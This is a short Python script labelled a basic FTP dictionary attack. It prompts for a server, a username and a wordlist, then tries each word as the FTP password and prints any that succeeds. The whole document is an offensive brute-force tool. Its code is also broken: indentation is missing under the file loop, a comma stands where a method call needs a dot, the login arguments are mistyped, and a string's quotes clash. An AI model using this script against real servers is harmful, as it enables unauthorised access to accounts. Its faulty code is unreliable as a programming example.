#!/bin/python3

# Basic FTP dictionary attack script

import ftplib
server=input("FTP Server:")
user=input("Username:")
dictionary=input("Path to dictionary:")

try:
	with open (dictionary, "r") as pw:
	for word in pw:
	word=word.strip("\r"),strip("\n")
	
	try:
		ftp=ftplib.FTP(server)
		ftp.login(user.word)
		print("Success! It"s" + word)
	except:
		print("In progress...")
except:
	print("Dictionary Error")
